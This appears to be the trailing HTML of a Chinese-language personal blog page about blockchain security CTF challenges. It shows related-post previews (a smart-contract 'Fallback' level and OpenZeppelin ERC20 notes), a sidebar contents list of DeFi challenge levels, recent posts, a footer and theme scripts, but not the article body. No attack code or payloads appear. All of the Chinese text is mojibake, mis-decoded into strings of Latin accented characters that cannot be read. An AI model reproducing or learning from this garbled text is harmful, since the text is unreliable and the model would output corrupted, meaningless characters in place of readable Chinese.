è¿™ä¸€å…³çš„åå­—æ˜¯Fallbackï¼Œfallbackæ˜¯ä¸€ç±»å‡½æ•°ï¼Œè¿™ç±»å‡½æ•°å¯ä»¥åœ¨åˆçº¦æ¥æ”¶åˆ°ä»¥å¤ªå¸æ—¶æ‰§è¡Œä¸€äº›æ“ä½œï¼ˆExplorationé‡Œæœ‰æ›´ç²¾ç¡®çš„å®šä¹‰ï¼‰ã€‚æœ¬é¢˜ä¸­ï¼Œå½“æ¥æ”¶çš„å¸å¤§äº0å¹¶ä¸”å¸çš„å‘é€æ–¹åœ¨å‘é€è¿™æ¡æ¶ˆæ¯ä¹‹å‰å·²ç»å¯¹è¯¥åˆçº¦æœ‰äº†è´¡çŒ®ï¼ˆå‘é€è¿‡å¸ï¼‰ï¼Œé‚£å°±æŠŠè¿™ä¸ªåˆçº¦çš„æ‰€æœ‰æƒç§»äº¤ç»™å¸çš„å‘é€æ–¹ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªéœ€è¦ 12await...</div></div></div></a><a class="pagination-related" href="/posts/18184.html" title="blockchain - openzeppelin æºç é˜…è¯»"><img class="cover" src="/img/cover6.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-05</div><div class="info-item-2">blockchain - openzeppelin æºç é˜…è¯»</div></div><div class="info-2"><div class="info-item-1"> å°±åƒåš pwn è¦è¯» glibc æºç ï¼Œåš blockchain æ€ä¹ˆèƒ½ä¸åˆ†æ openzeppelin å‘¢   [1] ERC20 ERC20 æ˜¯ä»¥å¤ªåŠä¸Šæœ€åŸºæœ¬çš„ä»£å¸è§„èŒƒ openzeppelin ERC20 æºç åœ¨è¿™ ä»¥ä¸‹æ˜¯è¯¥åˆçº¦çš„å˜é‡ 123456mapping(address account =&gt; uint256) private _balances; // account è¯¥ token çš„ä½™é¢// account æ‰¹å‡† spender ä½¿ç”¨çš„ä½™é¢ï¼Œå®é™…ä¸ŠèŠ±çš„è¿˜æ˜¯ account çš„ tokensmapping(address account =&gt; mapping(address spender =&gt; uint256)) private _allowances; uint256 private _totalSupply; // è¯¥åˆçº¦æ€»å…±å‘è¡Œçš„ token æ•°string private _name;         // è¯¥ token çš„ namestring private _symbol;       // ç®€çº¦ç‰ˆçš„...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">HeyGap</div><div class="author-info-description">An undergraduate student of Cybersecurity at SDU.</div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HeyGap"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/HeyGap" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2310769056@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">æ¬¢è¿æ¥åˆ°æˆ‘çš„åšå®¢ï¼Œä¸»è¦ç”¨æ¥è®°å½•ä¸€äº›å­¦ä¹ ç¬”è®°å’Œç”Ÿæ´»æ„Ÿæ‚Ÿã€‚</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E8%AE%BE%E7%BD%AE"><span class="toc-text">[0] ç¯å¢ƒè®¾ç½®</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unstoppable"><span class="toc-text">[1] Unstoppable</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#naivereceiver"><span class="toc-text">[2] NaiveReceiver</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#truster"><span class="toc-text">[3] Truster</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#side-entrance"><span class="toc-text">[4] Side Entrance</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#the-rewarder"><span class="toc-text">[5] The Rewarder</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#selfie"><span class="toc-text">[6] Selfie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#compromised"><span class="toc-text">[7] Compromised</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#section"><span class="toc-text">[8]</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/34368.html" title="fuzz - æµ…æåŸç†ä¸ AFLpp ä½¿ç”¨"><img src="/img/cover3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="fuzz - æµ…æåŸç†ä¸ AFLpp ä½¿ç”¨"/></a><div class="content"><a class="title" href="/posts/34368.html" title="fuzz - æµ…æåŸç†ä¸ AFLpp ä½¿ç”¨">fuzz - æµ…æåŸç†ä¸ AFLpp ä½¿ç”¨</a><time datetime="2025-02-14T05:46:00.000Z" title="å‘è¡¨äº 2025-02-14 13:02:00">2025-02-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/18184.html" title="blockchain - openzeppelin æºç é˜…è¯»"><img src="/img/cover6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="blockchain - openzeppelin æºç é˜…è¯»"/></a><div class="content"><a class="title" href="/posts/18184.html" title="blockchain - openzeppelin æºç é˜…è¯»">blockchain - openzeppelin æºç é˜…è¯»</a><time datetime="2025-02-05T10:15:00.000Z" title="å‘è¡¨äº 2025-02-05 18:02:00">2025-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/13129.html" title="blockchain - Uniswap V2"><img src="/img/cover2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="blockchain - Uniswap V2"/></a><div class="content"><a class="title" href="/posts/13129.html" title="blockchain - Uniswap V2">blockchain - Uniswap V2</a><time datetime="2025-02-04T06:09:00.000Z" title="å‘è¡¨äº 2025-02-04 14:02:00">2025-02-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/38292.html" title="blockchain - All Your Tokens are Belong to Us Demystifying Address Verification Vulnerabilities in Solidity Smart Contractsè®ºæ–‡é˜…è¯»ç¬”è®°"><img src="/img/cover8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="blockchain - All Your Tokens are Belong to Us Demystifying Address Verification Vulnerabilities in Solidity Smart Contractsè®ºæ–‡é˜…è¯»ç¬”è®°"/></a><div class="content"><a class="title" href="/posts/38292.html" title="blockchain - All Your Tokens are Belong to Us Demystifying Address Verification Vulnerabilities in Solidity Smart Contractsè®ºæ–‡é˜…è¯»ç¬”è®°">blockchain - All Your Tokens are Belong to Us Demystifying Address Verification Vulnerabilities in Solidity Smart Contractsè®ºæ–‡é˜…è¯»ç¬”è®°</a><time datetime="2025-01-13T12:01:00.000Z" title="å‘è¡¨äº 2025-01-13 20:01:00">2025-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/9333.html" title="2024å¹´ç»ˆæ€»ç»“"><img src="/img/cover10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024å¹´ç»ˆæ€»ç»“"/></a><div class="content"><a class="title" href="/posts/9333.html" title="2024å¹´ç»ˆæ€»ç»“">2024å¹´ç»ˆæ€»ç»“</a><time datetime="2025-01-12T04:55:00.000Z" title="å‘è¡¨äº 2025-01-12 12:01:00">2025-01-12</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/cover7.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2025 By HeyGap</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="ç®€ç¹è½¬æ¢">ä¸­</button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script data-pjax src="/self/btf.js"></script><script data-pjax src="/self/ch_en.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  æ•°æ®åŠ è½½ä¸­</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('å·²æŒ‚è½½butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>